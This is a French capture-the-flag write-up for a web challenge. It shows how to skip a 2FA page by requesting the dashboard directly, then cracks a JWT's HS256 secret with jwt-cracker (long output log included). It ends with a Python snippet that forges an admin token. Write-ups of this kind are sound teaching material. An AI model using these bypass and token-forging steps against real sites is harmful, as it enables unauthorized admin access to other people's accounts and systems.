# Double Trouble

*type* : Web

1 - Crée un compte via le bouton `Register`

2 - Se connecter avec le compte: Ici, une fois les identifiants entrés, dans `/verif_2af.php` il demande un nombre à 6 chiffres.
Pas de panique, on peut quand même entrer sans. Il suffit de se rendre `/` ou `/dashboard.php` ou autres ...

3 - Une fois entré, on va recuperer `auth_token` dans les cookies.
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMDQyLCJ1c2VybmFtZSI6ImRvZG8iLCJyb2xlIjoidXNlciJ9.pEnC3Z-QUOYiABCYUMAXbirQPHY8lC6YXdS0RXRc4Gc`

Si on decode les 2 premiers parties: 
```bash

$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
{"typ":"JWT","alg":"HS256"}%
  
$ echo -n "eyJ1c2VyX2lkIjoxMDQyLCJ1c2VybmFtZSI6ImRvZG8iLCJyb2xlIjoidXNlciJ9" | base64 -d
{"user_id":1042,"username":"dodo","role":"user"}%

```

On pourrait, comme les autres challenges web changer user_id: 1 et role: admin et alg: none. En essayant, il refuse et redirige directement vers `/login.php`

Donc, il exige une authentification pour `admin`. Il nous faut donc le `secret` pour reconstituer le token d'`admin`

4 - Installation de l'outils `jwt-cracker`

```bash
$ npm install --global jwt-cracker
```

5 - Lancement du bruteforce sur le secret:
Cela prend un peu de temps

```bash
$ jwt-cracker -t eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMDQyLCJ1c2VybmFtZSI6ImRvZG8iLCJyb2xlIjoidXNlciJ9.pEnC3Z-QUOYiABCYUMAXbirQPHY8lC6YXdS0RXRc4Gc -a abcdefghijklmnopqrstuvwxyz --max 6
Attempts: 100000 (31K/s last attempt was 'dxqe')
Attempts: 200000 (37K/s last attempt was 'hvik')
Attempts: 300000 (40K/s last attempt was 'ltaq')
Attempts: 400000 (42K/s last attempt was 'prsv')
Attempts: 500000 (42K/s last attempt was 'tpkba')
Attempts: 600000 (44K/s last attempt was 'xncha')
Attempts: 700000 (45K/s last attempt was 'bmuma')
Attempts: 800000 (47K/s last attempt was 'fkmsa')
Attempts: 900000 (47K/s last attempt was 'jieya')
Attempts: 1000000 (47K/s last attempt was 'ngwdb')
Attempts: 1100000 (47K/s last attempt was 'reojb')
Attempts: 1200000 (48K/s last attempt was 'vcgpb')
Attempts: 1300000 (48K/s last attempt was 'zayub')
Attempts: 1400000 (49K/s last attempt was 'dzpac')
Attempts: 1500000 (49K/s last attempt was 'hxhgc')
Attempts: 1600000 (49K/s last attempt was 'lvzlc')
Attempts: 1700000 (50K/s last attempt was 'ptrrc')
Attempts: 1800000 (49K/s last attempt was 'trjxc')
Attempts: 1900000 (50K/s last attempt was 'xpbdd')
Attempts: 2000000 (50K/s last attempt was 'botid')
Attempts: 2100000 (50K/s last attempt was 'fmlod')
Attempts: 2200000 (50K/s last attempt was 'jkdud')
Attempts: 2300000 (50K/s last attempt was 'nivzd')
Attempts: 2400000 (51K/s last attempt was 'rgnfe')
Attempts: 2500000 (51K/s last attempt was 'vefle')
Attempts: 2600000 (51K/s last attempt was 'zcxqe')
Attempts: 2700000 (51K/s last attempt was 'dbpwe')
Attempts: 2800000 (51K/s last attempt was 'hzgcf')
Attempts: 2900000 (52K/s last attempt was 'lxyhf')
Attempts: 3000000 (52K/s last attempt was 'pvqnf')
Attempts: 3100000 (52K/s last attempt was 'ttitf')
Attempts: 3200000 (52K/s last attempt was 'xrazf')
Attempts: 3300000 (52K/s last attempt was 'bqseg')
Attempts: 3400000 (52K/s last attempt was 'fokkg')
Attempts: 3500000 (52K/s last attempt was 'jmcqg')
Attempts: 3600000 (52K/s last attempt was 'nkuvg')
Attempts: 3700000 (52K/s last attempt was 'rimbh')
Attempts: 3800000 (52K/s last attempt was 'vgehh')
Attempts: 3900000 (52K/s last attempt was 'zewmh')
Attempts: 4000000 (52K/s last attempt was 'ddosh')
Attempts: 4100000 (52K/s last attempt was 'hbgyh')
Attempts: 4200000 (52K/s last attempt was 'lzxdi')
Attempts: 4300000 (51K/s last attempt was 'pxpji')
Attempts: 4400000 (52K/s last attempt was 'tvhpi')
Attempts: 4500000 (52K/s last attempt was 'xtzui')
Attempts: 4600000 (52K/s last attempt was 'bsraj')
Attempts: 4700000 (52K/s last attempt was 'fqjgj')
Attempts: 4800000 (52K/s last attempt was 'jobmj')
Attempts: 4900000 (52K/s last attempt was 'nmtrj')
Attempts: 5000000 (52K/s last attempt was 'rklxj')
Attempts: 5100000 (52K/s last attempt was 'viddk')
Attempts: 5200000 (52K/s last attempt was 'zgvik')
Attempts: 5300000 (52K/s last attempt was 'dfnok')
Attempts: 5400000 (52K/s last attempt was 'hdfuk')
Attempts: 5500000 (52K/s last attempt was 'lbxzk')
Attempts: 5600000 (52K/s last attempt was 'pzofl')
Attempts: 5700000 (52K/s last attempt was 'txgll')
Attempts: 5800000 (51K/s last attempt was 'xvyql')
Attempts: 5900000 (51K/s last attempt was 'buqwl')
Attempts: 6000000 (51K/s last attempt was 'fsicm')
Attempts: 6100000 (51K/s last attempt was 'jqaim')
Attempts: 6200000 (50K/s last attempt was 'nosnm')
Attempts: 6300000 (50K/s last attempt was 'rmktm')
Attempts: 6400000 (50K/s last attempt was 'vkczm')
Attempts: 6500000 (50K/s last attempt was 'ziuen')
Attempts: 6600000 (49K/s last attempt was 'dhmkn')
Attempts: 6700000 (49K/s last attempt was 'hfeqn')
Attempts: 6800000 (49K/s last attempt was 'ldwvn')
Attempts: 6900000 (49K/s last attempt was 'pbobo')
Attempts: 7000000 (49K/s last attempt was 'tzfho')
Attempts: 7100000 (48K/s last attempt was 'xxxmo')
Attempts: 7200000 (48K/s last attempt was 'bwpso')
Attempts: 7300000 (48K/s last attempt was 'fuhyo')
Attempts: 7400000 (48K/s last attempt was 'jszdp')
Attempts: 7500000 (48K/s last attempt was 'nqrjp')
Attempts: 7600000 (48K/s last attempt was 'rojpp')
Attempts: 7700000 (47K/s last attempt was 'vmbvp')
Attempts: 7800000 (47K/s last attempt was 'zktaq')
SECRET FOUND: tareq
Time taken (sec): 166.971
Total attempts: 7880000
```
Ainsi, le secret est `tareq` :)

6 - Reconstruction du token

```python3

import jwt

secret = "tareq"
admin_payload = {"user_id": 1, "username": "admin", "role": "admin"}
admin_token = jwt.encode(admin_payload, secret, algorithm="HS256")
print(f"Admin token: {admin_token}")

```

En entrant le token ainsi construit en tant que auth_token, on obtient l'accés au panel administateur et au flag!
